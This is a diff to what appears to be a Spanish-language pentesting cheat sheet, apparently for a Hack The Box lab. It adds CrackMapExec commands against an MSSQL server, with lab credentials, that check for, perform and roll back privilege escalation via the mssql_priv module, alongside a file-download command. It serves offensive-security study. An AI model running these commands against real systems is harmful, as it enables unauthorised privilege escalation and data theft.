@@ -49,3 +49,17 @@ Si el user es DBA podemos ejecutar comandos con la flag -x
 ### Para descargar un archivo
 
     crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth --get-file <path_file> <file_a_crear>
+
+# PE
+
+### Revisar si podemos elevar privilegios
+    crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv
+### Ejecutar de manera automática la elevación de privilegios
+
+    crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=privesc
+
+Luego vamos poder ejecutar comandos o hacer un rollback
+
+### Hacer rollback de privilegios
+
+    crackmapexec mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
